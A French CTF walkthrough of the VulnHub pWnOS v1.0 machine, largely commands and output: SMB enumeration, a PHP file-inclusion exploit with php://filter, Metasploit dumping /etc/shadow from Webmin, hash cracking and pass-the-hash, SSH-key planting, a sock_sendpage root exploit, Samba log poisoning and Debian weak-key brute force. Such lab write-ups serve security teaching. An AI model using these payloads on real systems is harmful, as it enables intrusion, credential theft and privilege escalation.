# Solution du CTF pWnOS v1.0

apropos
-------

[pWnOs v1.0](http://vulnhub.com/entry/pwnos-10,33/) est un CTF disponible sur *VulnHub* et créé en juin 2008. Pas tout récent donc. Ici, pas de drapeau à obtenir mais juste un accès root sur la machine.  

On découvre de nombreux services présents : SSH, Apache, Samba et un Webmin.  

```plain
Nmap scan report for 192.168.1.27
Host is up (0.00013s latency).
Not shown: 65530 closed ports
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 4.6p1 Debian 5build1 (protocol 2.0)
| ssh-hostkey: 1024 e4:46:40:bf:e6:29:ac:c6:00:e2:b2:a3:e1:50:90:3c (DSA)
|_2048 10:cc:35:45:8e:f2:7a:a1:cc:db:a0:e8:bf:c7:73:3d (RSA)
80/tcp    open  http        Apache httpd 2.2.4 ((Ubuntu) PHP/5.2.3-1ubuntu6)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html).
139/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
445/tcp   open  netbios-ssn Samba smbd 3.X (workgroup: MSHOME)
10000/tcp open  http        MiniServ 0.01 (Webmin httpd)
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
| ndmp-version: 
|_  ERROR: Failed to get host information from server
MAC Address: 00:0C:29:5E:18:C9 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6.22
OS details: Linux 2.6.22 (embedded, ARM)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: UBUNTUVM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown>
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.26a)
|   Computer name: ubuntuvm
|   NetBIOS computer name: 
|   Domain name: nsdlab
|   FQDN: ubuntuvm.NSDLAB
|_  System time: 2014-04-16T13:59:34-05:00
| smb-security-mode: 
|   Account that was used for smb scripts: guest
|   User-level authentication
|   SMB Security: Challenge/response passwords supported
|_  Message signing disabled (dangerous, but default)
|_smbv2-enabled: Server doesn't support SMBv2 protocol
```

On sait qu'il existe quelques exploits pour *Webmin* dont certains sont utilisés [par des bots et des mass-rooters](http://devloop.users.sourceforge.net/index.php?article20/intrusion-du-24-novembre-2006).  

Faisons tout de même un tour du côté du *Samba* pour voir si on trouve quelque chose d'intéressant.  

whereis samba (in the kitchen ?)
--------------------------------

```plain
$ nmblookup -A 192.168.1.27
Looking up status of 192.168.1.27
        UBUNTUVM        <00> -         H <ACTIVE> 
        UBUNTUVM        <03> -         H <ACTIVE> 
        UBUNTUVM        <20> -         H <ACTIVE> 
        ..__MSBROWSE__. <01> - <GROUP> H <ACTIVE> 
        MSHOME          <1d> -         H <ACTIVE> 
        MSHOME          <1e> - <GROUP> H <ACTIVE> 
        MSHOME          <00> - <GROUP> H <ACTIVE> 

        MAC Address = 00-00-00-00-00-00

$ smbclient -L UBUNTUVM -N                                                                                                                                                                 
Anonymous login successful                                                                                                                                                                                     
Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]                                                                                                                                                               

        Sharename       Type      Comment                                                                                                                                                                      
        ---------       ----      -------                                                                                                                                                                      
        home            Disk      Home Directory for vmware User                                                                                                                                               
        print$          Disk      Printer Drivers                                                                                                                                                              
        IPC$            IPC       IPC Service (ubuntuvm)                                                                                                                                                       
Anonymous login successful                                                                                                                                                                                     
Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]                                                                                                                                                               

        Server               Comment                                                                                                                                                                           
        ---------            -------                                                                                                                                                                           
        UBUNTUVM             ubuntuvm

        Workgroup            Master
        ---------            -------
        MSHOME               UBUNTUVM
```

On tente d’accéder au partage via une connexion anonyme mais l'accès est refusé :  

```plain
$ smbclient -I 192.168.1.27 -U "" -N //UBUNTUVM/home
Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
tree connect failed: NT_STATUS_ACCESS_DENIED
```

*Metasploit* propose divers exploits pour *Samba* (*lsa\_transnames\_heap, chain\_reply, setinfopolicy\_heap*) mais aucun ne nous ouvre de porte.  

En revanche le module pour énumérer les utilisateurs donne de bons résultats.  

```plain
msf auxiliary(smb_enumusers) > set RHOSTS 192.168.1.27
RHOSTS => 192.168.1.27
msf auxiliary(smb_enumusers) > exploit

[*] 192.168.1.27 UBUNTUVM [ games, nobody, proxy, syslog, www-data, root, news, bin, mail, dhcp, daemon, sshd,
    man, lp, mysql, gnats, backup, sys, klog, vmware, list, irc, sync, uucp ] ( LockoutTries=0 PasswordMin=5 )
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

On profite de ces informations pour brute-forcer les comptes SMB avec *Medusa* mais force est de constater que les mots de passe résistent.  

On décide alors de se tourner vers le site web qui est tout aussi minimaliste que celui vu dans le cadre [du CTF VulnImage](http://devloop.users.sourceforge.net/index.php?article80/solution-du-ctf-vulnimage).  

L'index à la racine du site effectue une redirection via javascript sur laquelle *Wapiti* bute. Il suffit d'utiliser l'option -s pour lui donner un point de départ supplémentaire (output réduit) :  

```plain
./bin/wapiti http://192.168.1.27/ -s "http://192.168.1.27/index1.php?help=true&connect=true" -m "all,nikto,backup,htaccess"

[+] Lancement du module file
Eventuelle faille de type include() dans http://192.168.1.27/index1.php via une injection dans le paramètre connect
  Evil url: http://192.168.1.27/index1.php?help=true&connect=http%3A%2F%2Fwww.google.fr%2F%3F
Divulgation de fichiers sur un système Linux dans http://192.168.1.27/index1.php via une injection dans le paramètre connect
  Evil url: http://192.168.1.27/index1.php?help=true&connect=%2Fetc%2Fpasswd
```

man include
-----------

*Wapiti* a facilement trouvé une faille include() locale dans le paramètre *connect* de *index1.php*.  

L'inclusion donne malheureusement du fil à retordre. Effectivement on peut inclure des fichiers locaux en spécifiant le path absolu ou relatif mais il semble impossible d'élever cette faille en une exécution de commande.  

J'ai testé toutes les astuces classiques et moins classiques (*php://input*, *data://*, */proc/self/environ* et bien sûr l'inclusion de logs *Apache*).  

L'autre problème de l'inclusion c'est que le code PHP est évidemment interprété ce qui pose problème quand on veut obtenir du code source PHP présent sur le serveur.  

Par exemple *dirb* a trouvé une installation *phpMyAdmin* dans */php/phpMyAdmin*. Si on inclut bêtement le fichier *php/phpMyAdmin/config.inc.php* alors on aura droit à une page blanche.  

Cela peut être contourné bien l'utilisation de filtres qui convertissent les données avant l'inclusion :  

```plain
connect=php://filter/convert.base64-encode/resource=php/phpMyAdmin/config.inc.php
```

De cette façon on obtient le contenu du fichier de configuration de *phpMyAdmin* encodé en *base64*.  

Mais une fois décodé on se rends compte que MySQL utilise un compte root en local uniquement sans mot de passe (pas de mot de passe et pas d'accès depuis l'extérieur, on n'est pas plus avancés).  

Avec un script fait main je peux lister rapidement les fichiers auxquels j'ai accès via cette faille include() :  

```python
import requests

URL = "http://192.168.1.27/index1.php?help=true&connect="

fd = open("logs.txt")

while True:
    logfile = fd.readline()
    if not logfile:
        break
    logfile = logfile.strip()
    r = requests.get(URL + logfile)
    if not "Failed opening" in r.content:
        print "+ Acces a", logfile, "ok"
    elif "Permission denied" in r.content:
        print "- Acces a", logfile, "refuse"

fd.close()
```

Pour remplir ma liste de fichiers à tester je me suis basé sur un article de [BlackHat Library](http://www.blackhatlibrary.net/File_Inclusion) ainsi que des idées perso.  

L'output donne les résultats suivants pour les fichiers accessibles :  

```plain
Acces a /var/log/lastlog ok
Acces a /var/log/wtmp ok
Acces a /var/run/utmp ok
Acces a /etc/passwd ok
Acces a /etc/group ok
Acces a /etc/hosts ok
Acces a /etc/motd ok
Acces a /etc/issue ok
Acces a /etc/crontab ok
Acces a /proc/version ok
Acces a /proc/cmdline ok
Acces a /etc/apache2/apache2.conf ok
Acces a /etc/apache2/httpd.conf ok
Acces a /etc/apache2/sites-enabled/000-default ok
Acces a /etc/apache2/sites-available/default ok
Acces a /etc/ssh/sshd_config ok
Acces a /etc/mysql/my.cnf ok
Acces a /root/.bash_history ok
Acces a /etc/php5/apache2/php.ini ok
Acces a /var/log/faillog ok
Acces a /home/osama/.bash_history ok
Acces a /home/vmware/.profile ok
Acces a /home/vmware/.bashrc ok
```

Le *.bash\_history* du root, bien que remplis, ne donne rien d'intéressant pour la résolution du CTF.  

Qui plus est, aucun accès a des clés SSH n'a été trouvé.  

Heureusement le */etc/passwd* nous donne quelques accounts supplémentaires, de quoi redonner espoir :  

```plain
obama:x:1001:1001::/home/obama:/bin/bash
osama:x:1002:1002::/home/osama:/bin/bash
yomama:x:1003:1003::/home/yomama:/bin/bash
```

Là encore *Medusa* (pour SMB) et *Hydra* (pour SSH) ne donnent aucun résultats.  

Il est temps de se tourner vers le Webmin.  

Webmin and 3 little monkeys
---------------------------

Le module file\_disclosure de *Metasploit* va au delà de nos attentes puisqu'on voit ce que root voit :  

```plain
msf> use auxiliary/admin/webmin/file_disclosure
msf auxiliary(file_disclosure) > set RHOST 192.168.1.27
RHOST => 192.168.1.27
msf auxiliary(file_disclosure) > set RPATH /etc/shadow
RPATH => /etc/shadow
msf auxiliary(file_disclosure) > exploit

[*] Attempting to retrieve /etc/shadow...
[*] The server returned: 200 Document follows
root:$1$LKrO9Q3N$EBgJhPZFHiKXtK0QRqeSm/:14041:0:99999:7:::
daemon:*:14040:0:99999:7:::
bin:*:14040:0:99999:7:::
sys:*:14040:0:99999:7:::
sync:*:14040:0:99999:7:::
games:*:14040:0:99999:7:::
man:*:14040:0:99999:7:::
lp:*:14040:0:99999:7:::
mail:*:14040:0:99999:7:::
news:*:14040:0:99999:7:::
uucp:*:14040:0:99999:7:::
proxy:*:14040:0:99999:7:::
www-data:*:14040:0:99999:7:::
backup:*:14040:0:99999:7:::
list:*:14040:0:99999:7:::
irc:*:14040:0:99999:7:::
gnats:*:14040:0:99999:7:::
nobody:*:14040:0:99999:7:::
dhcp:!:14040:0:99999:7:::
syslog:!:14040:0:99999:7:::
klog:!:14040:0:99999:7:::
mysql:!:14040:0:99999:7:::
sshd:!:14040:0:99999:7:::
vmware:$1$7nwi9F/D$AkdCcO2UfsCOM0IC8BYBb/:14042:0:99999:7:::
obama:$1$hvDHcCfx$pj78hUduionhij9q9JrtA0:14041:0:99999:7:::
osama:$1$Kqiv9qBp$eJg2uGCrOHoXGq0h5ehwe.:14041:0:99999:7:::
yomama:$1$tI4FJ.kP$wgDmweY9SAzJZYqW76oDA.:14041:0:99999:7:::
```

On passe les hashs à *John* qui trouve en quelques minutes avec un bon dictionnaire le mot de passe *h4ckm3* pour *vmware* (1st monkey).  

L'autre méthode consiste à obtenir le hash dans une forme plus attaquable, c'est à dire sous sa forme NTLM sans salt.  

Pour cela on doit récupérer la base des utilisateurs Samba :  

```plain
msfcli auxiliary/admin/webmin/file_disclosure RHOST=192.168.1.27 RPATH=/var/lib/samba/passdb.tdb E > /tmp/tdb
```

On la passe ensuite à un éditeur hexadécimal pour retirer l'output de *Metasploit* (ou on trouve un exploit similaire sur *exploit-db* à personnaliser pour retirer l'output).  

On doit recopier le fichier tdb sur son système pour que les outils Samba le retrouvent (je n'ai pas vu d'options pour spécifier un path particulier).  

```plain
# cp /tmp/tdb /etc/samba/passdb.tdb
# pdbedit -L -w
vmware:4294967295:XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX:FD64812D22B9B94638C2A7FF8C49DDC6:[U          ]:LCT-485138D9:
```

Il est alors possible de soumettre le hash NTLM sur une base de données en ligne comme *crackstation.net* ou à *ophcrack*. Là c'est de l'instantané (2nd monkey).  

Encore mieux, on peut réutiliser le hash via la technique *pass-the-hash*, sauf que les outils disponibles sont majoritairement destinés à Windows.  

*Impacket* a un script qui marche (plus ou moins) avec Samba (3rd monkey) :  

```plain
python-impacket$ python examples/smbclient.py
# open 192.168.1.27 445
# login_hash vmware 00000000000000000000000000000000 FD64812D22B9B94638C2A7FF8C49DDC6
# shares
home
print$
IPC$
# use home
# ls
.
..
.bashrc
.bash_logout
.profile
.bash_history
.sudo_as_admin_successful
.ssh
```

Accio shell !
-------------

Dans tous les cas on arrive sur l'opération suivante qui consiste à récupérer le fichier *authorized\_keys* de l'utilisateur *vmware*, y ajouter notre clé publique et le renvoyer dans *.ssh* :  

```plain
$ smbclient -I 192.168.1.27 -U vmware //UBUNTUVM/home
Enter vmware's password: 
Domain=[MSHOME] OS=[Unix] Server=[Samba 3.0.26a]
smb: \> dir
  .                                   D        0  Thu Jun 19 17:11:26 2008
  ..                                  D        0  Wed Jun 11 16:26:30 2008
  .bashrc                             H     2298  Tue Jun 10 14:10:59 2008
  .bash_logout                        H      220  Tue Jun 10 14:10:59 2008
  .profile                            H      566  Tue Jun 10 14:10:59 2008
  .bash_history                       H       65  Fri Jun 20 21:39:34 2008
  .sudo_as_admin_successful           H        0  Tue Jun 10 19:43:15 2008
  .ssh                               DH        0  Thu Jun 12 18:19:40 2008

                38110 blocks of size 131072. 28930 blocks available
smb: \> cd .ssh
smb: \.ssh\> dir
  .                                   D        0  Thu Jun 12 18:19:40 2008
  ..                                  D        0  Thu Jun 19 17:11:26 2008
  known_hosts                         N      884  Wed Jun 11 17:44:36 2008
  authorized_keys                     N      397  Wed Jun 11 16:59:01 2008

                38110 blocks of size 131072. 28930 blocks available
smb: \.ssh\> get authorized_keys
getting file \.ssh\authorized_keys of size 397 as authorized_keys (43,1 KiloBytes/sec) (average 43,1 KiloBytes/sec)
smb: \.ssh\> put authorized_keys
putting file authorized_keys as \.ssh\authorized_keys (779,2 kb/s) (average 779,3 kb/s)
```

On obtient alors notre shell tant attendu :  

```plain
ssh vmware@192.168.1.27
Enter passphrase for key 'id_rsa': 
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

Last login: Fri Jun 20 14:35:37 2008
vmware@ubuntuvm:~$ id
uid=1000(vmware) gid=1000(vmware) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
vmware@ubuntuvm:~$ uname -a
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686 GNU/Linux
```

sudo accio shell !
------------------

On récupère un exploit pour passer root. Ici [un exploit pour sock\_sendpage() qui utilise la présence de PulseAudio sur le système](http://www.exploit-db.com/exploits/9641/) :  

```plain
vmware@ubuntuvm:~$ tar zxvf 2009-linux-sendpage3.tar.gz 
linux-sendpage3/
linux-sendpage3/sesearch-mmap_zero
linux-sendpage3/run
linux-sendpage3/exploit-pulseaudio.c
linux-sendpage3/exploit.c
linux-sendpage3/runcon-mmap_zero
vmware@ubuntuvm:~$ cd linux-sendpage3/
vmware@ubuntuvm:~/linux-sendpage3$ ls
exploit.c  exploit-pulseaudio.c  run  runcon-mmap_zero  sesearch-mmap_zero
vmware@ubuntuvm:~/linux-sendpage3$ ./run
# id
uid=0(root) gid=0(root) groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),111(lpadmin),112(admin),1000(vmware)
```

Que demander de plus ?  

After-pwn
---------

J'ai tout de même jeté un oeil sur les fichiers de logs pour voir si on pouvait aller plus loin avec la faille include() et... on ne pouvait pas car les accès sont tous trop restreints.  

Toutefois, admettons que les logs de Samba fussent lisible on aurait d'abord remarqué que leur nom contient l'adresse IP ou le nom d'hôte du client (comme indiqué dans */etc/samba/smb.conf*) :  

```plain
# This tells Samba to use a separate log file for each machine
# that connects
   log file = /var/log/samba/log.%m
```

Il aurait alors été possible d'injecter du PHP dans les logs en faisant appel à un partage inexistant :  

```plain
$ smbclient -I 192.168.1.27  '//UBUNTUVM/<?php phpinfo(); ?>' -U "" -N
```

Finalement l'inclusion aurait fonctionné avec le fichier */var/log/samba/log.192.168.1.3*.  

Additionnellement, je suis passé à côté de [la faille d'implémentation d'*OpenSSL* par *Debian*](https://en.wikipedia.org/wiki/OpenSSL#Vulnerability_in_the_Debian_implementation).  

Pour faire court, cette faille permet de retrouver une clé privée valide à partir de la base limitée de clés que le générateur d'aléa cassé peut générer.  

Un exmple sera plus parlant. On trouve [un exploit en Python sur exploit-db](http://www.exploit-db.com/exploits/5720/) :  

```plain
$ python bkeys.py

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org
./exploit.py <dir> <host> <user> [[port] [threads]]
    <dir>: Path to SSH privatekeys (ex. /home/john/keys) without final slash
    <host>: The victim host
    <user>: The user of the victim host
    [port]: The SSH port of the victim host (default 22)
    [threads]: Number of threads (default 4) Too big numer is bad

$ python bkeys.py rsa/2048/ 192.168.1.27 obama 

-OpenSSL Debian exploit- by ||WarCat team|| warcat.no-ip.org

Tested 214 keys | Remaining 32554 keys | Aprox. Speed 42/sec
Tested 440 keys | Remaining 32328 keys | Aprox. Speed 45/sec
Tested 663 keys | Remaining 32105 keys | Aprox. Speed 44/sec
(snip)
Tested 16000 keys | Remaining 16768 keys | Aprox. Speed 45/sec
Tested 16229 keys | Remaining 16539 keys | Aprox. Speed 45/sec
Tested 16451 keys | Remaining 16317 keys | Aprox. Speed 44/sec

Key Found in file: dcbe2a56e8cdea6d17495f6648329ee2-4679
Execute: ssh -lobama -p22 -i rsa/2048//dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.1.27

Tested 16654 keys | Remaining 16114 keys | Aprox. Speed 40/sec
```

Copier / coller  

```plain
$ ssh -lobama -p22 -i rsa/2048//dcbe2a56e8cdea6d17495f6648329ee2-4679 192.168.1.27
Linux ubuntuvm 2.6.22-14-server #1 SMP Sun Oct 14 23:34:23 GMT 2007 i686

Last login: Thu Jun 19 10:10:29 2008
obama@ubuntuvm:~$ id
uid=1001(obama) gid=1001(obama) groups=1001(obama)
```

:x

*Published April 18 2014 at 13:51*